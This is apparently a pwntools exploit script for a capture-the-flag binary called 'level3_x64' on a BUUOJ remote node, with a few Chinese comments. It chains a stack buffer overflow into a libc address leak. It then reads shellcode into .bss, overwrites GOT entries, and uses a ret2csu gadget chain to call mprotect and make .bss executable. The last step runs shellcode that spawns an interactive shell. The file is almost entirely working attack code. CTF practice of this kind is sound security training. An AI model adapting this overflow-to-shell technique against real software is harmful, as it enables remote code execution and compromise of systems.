from pwn import  *
from LibcSearcher import LibcSearcher
from sys import argv

def ret2libc(leak, func, search_fun='', path=''):
	if path == '':
		libc = LibcSearcher(func, leak)
		base = leak - libc.dump(func)
		system = base + libc.dump('system')
		binsh = base + libc.dump('str_bin_sh')
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.dump(search_fun)
	else:
		libc = ELF(path)
		base = leak - libc.sym[func]
		system = base + libc.sym['system']
		binsh = base + next(libc.search(b'/bin/sh'))
		if search_fun == '':
			return (base, system, binsh)
		search_addr = base + libc.sym[search_fun]

	return (base, system, binsh, search_addr)

s       = lambda data               :p.send(data)
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
r       = lambda num=4096           :p.recv(num)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
itr     = lambda                    :p.interactive()
uu32    = lambda data               :u32(data.ljust(4,b'\x00'))
uu64    = lambda data               :u64(data.ljust(8,b'\x00'))
leak    = lambda name,addr          :log.success('{} = {:#x}'.format(name, addr))

context(os='linux', arch='amd64', log_level='debug')
# context(os='linux', arch='i386', log_level='debug')
binary = './level3_x64'

context.binary = binary
elf = ELF(binary)
p = remote('node4.buuoj.cn',26189) if argv[1]=='r' else process(binary)
# p = process(["/path/to/ld.so", binary],
#             env={"LD_PRELOAD":"/path/to/libc.so.6"})
# libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def int2bytes(content):
	return bytes(str(content),encoding='utf-8')
def bytes2int(content):
	return str(content,encoding='utf-8')

def dbg():
	gdb.attach(p)
	pause()

#ret2libc
pop_rsi_r15_ret = 0x4006b1
pop_rdi_ret = 0x4006b3
main_addr = 0x4005E6
ret2csu1 = 0x4006A6
ret2csu2 = 0x400690
write_got=elf.got['write']
write_plt=elf.plt['write']


payload = b'a' * (0x80 + 0x8) + p64(pop_rdi_ret) + p64(1) + p64(pop_rsi_r15_ret) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_addr)
sa(b'Input:\n',payload)
write_addr = uu64(r(6))
log.success('write_addr: ',write_addr)

base, system_addr, bin_sh_addr, mprotect_addr = ret2libc(write_addr,'write','mprotect')

#read shellcode to bss
bss_addr = elf.bss()
read_plt = elf.plt['read']
payload = b'a' * (0x80 + 0x8) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_addr) + p64(0) + p64(read_plt) + p64(main_addr)
sa(b'Input:\n',payload)
shellcode = asm(shellcraft.sh())
s(shellcode)

#write bss to got table
bss_got = 0x600A48
payload = b'a' * (0x80 + 0x8) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(bss_got) + p64(0) + p64(read_plt) + p64(main_addr)
sa(b'Input:\n',payload)
s(p64(bss_addr))



#write mprotect to got table
mprotect_got = 0x600A50
payload = b'a' * (0x80 + 0x8) + p64(pop_rdi_ret) + p64(0) + p64(pop_rsi_r15_ret) + p64(mprotect_got) + p64(0) + p64(read_plt) + p64(main_addr)
sa(b'Input:\n',payload)
s(p64(mprotect_addr))



#ret2csu --先利用mprotect给bss段可执行权限
rbx = 0
rbp = 1
r12 = mprotect_got #call r12+rbx*8
r13 = 7 #rdx = r13
r14 = 0x1000 #rsi = r14
r15 = 0x600000#edi = r15
# mprotect的第一个参数标识要写的内存页的首地址。这里是以页为单位访问。
# 一页是４kb也就是0x1000字节所以mprotect的第一个参数必须是0x1000的倍数。  -----一开始我不理解为什么是0x600000，现在理解了
# 第二个参数标识要设置的权限的地址的范围。这个多少都无所谓，不过需要把bss段包含进去。
# 第三个参数必须是7 设置可执行权限
payload = b'a' * (0x80 + 0x8) + p64(ret2csu1) + b'a'* 8 + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
payload += p64(ret2csu2)

r12 = bss_got #call r12+rbx*8
r13 = 0 #rdx = r13
r14 = 0 #rsi = r14
r15 = 0#edi = r15
payload += b'a'* 8 + p64(rbx) + p64(rbp) + p64(r12) + p64(r13) + p64(r14) + p64(r15)
payload += p64(ret2csu2)
sa(b'Input:\n',payload)
itr()
